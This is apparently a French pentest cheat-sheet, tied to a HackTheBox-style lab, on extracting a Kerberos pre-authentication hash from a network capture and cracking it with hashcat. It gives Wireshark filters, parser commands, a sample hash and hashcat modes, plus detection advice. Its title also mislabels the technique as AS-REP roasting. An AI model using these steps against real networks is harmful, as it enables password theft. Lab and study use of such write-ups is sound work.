# Kerberos Pre-Authentication Attack

### <mark style="color:red;">Kerberos Pre-Authentication Attack (AS-REP Roasting)</mark>

#### <mark style="color:green;">📋 Description</mark>

Extraction et cracking d'un hash Kerberos à partir d'un paquet AS-REQ (Authentication Service Request) capturé sur le réseau. L'attaque exploite le fait que le timestamp chiffré dans AS-REQ utilise le mot de passe de l'utilisateur comme clé.

#### 🎯 Prérequis

* Capture réseau contenant un AS-REQ avec données chiffrées (etype 18 ou 23)
* Wireshark ou outil d'analyse PCAP
* Hashcat pour le cracking

#### <mark style="color:green;">🔍 Extraction du hash depuis PCAP</mark>

**Méthode manuelle (Wireshark)**

```
1. Ouvrir le PCAP dans Wireshark
2. Filtrer : kerberos.msg_type == 10 (AS-REQ)
3. Trouver le paquet avec encrypted timestamp
4. Extraire :
   - Encryption type (etype) : KRB5-PADATA-ENC-TIMESTAMP > etype
   - Username : CNameString
   - Domain : realm
   - Encrypted timestamp : cipher (hex)
```

**Méthode automatique**

```bash
# Avec krb5_roast_parser
python3 krb5_roast_parser.py CAPTURE.pcap as_req

# Avec Pcredz
python3 Pcredz -f CAPTURE.pcap
```

#### <mark style="color:green;">🔐 Format du hash</mark>

```
$krb5pa$ETYPE$USERNAME$DOMAIN$ENCRYPTED_TIMESTAMP

Exemple :
$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
```

**Composants :**

* `$krb5pa$` : Identifiant du type de hash
* `18` : Encryption type (17=AES128, 18=AES256, 23=RC4-HMAC)
* `Lion.SK` : Nom d'utilisateur
* `CERTIFICATE.HTB` : Domaine (FQDN avec .htb ou .local)
* `23f5...` : Timestamp chiffré (hex)

#### <mark style="color:green;">⚔️ Cracking</mark>

```bash
# Hashcat détecte automatiquement le mode
hashcat hash.txt /path/to/wordlist.txt

# Ou spécifier le mode explicitement
hashcat -m 19900 hash.txt rockyou.txt

# Modes Hashcat :
# 19900 : Kerberos 5, etype 18 (AES256)
# 19800 : Kerberos 5, etype 17 (AES128)  
# 19700 : Kerberos 5, etype 23 (RC4-HMAC)
```

#### <mark style="color:green;">🎭 Différences avec AS-REP Roasting classique</mark>

| Aspect        | AS-REP Roasting                             | PCAP-based Attack           |
| ------------- | ------------------------------------------- | --------------------------- |
| Source        | Active Directory                            | Capture réseau              |
| Prérequis     | "Do not require Kerberos preauthentication" | AS-REQ avec etype dans PCAP |
| Hash type     | $krb5asrep$                                 | $krb5pa$                    |
| Détectabilité | Génère des événements AD                    | Passive                     |

#### <mark style="color:green;">⚠️ Notes importantes</mark>

* **TOUJOURS** ajouter `.htb` ou `.local` au domaine dans le hash
* Vérifier que l'encrypted timestamp est présent (sinon pas de hash)
* Les captures sans pre-authentication ne contiennent pas de données exploitables

#### <mark style="color:green;">🛡️ Détection/Prévention</mark>

* Utiliser des politiques de mots de passe fortes
* Monitorer les échecs d'authentification répétés
* Segmenter le réseau pour limiter la capture de trafic
* Utiliser etype 18 (AES256) au minimum

#### <mark style="color:green;">📚 Références</mark>

* [Kerberos Pre-Authentication Explained](https://www.tarlogic.com/blog/how-kerberos-works/)
* [Extracting Kerberos hashes from PCAP](https://vbscrub.com/2020/02/27/getting-passwords-from-kerberos-pre-authentication-packets/)
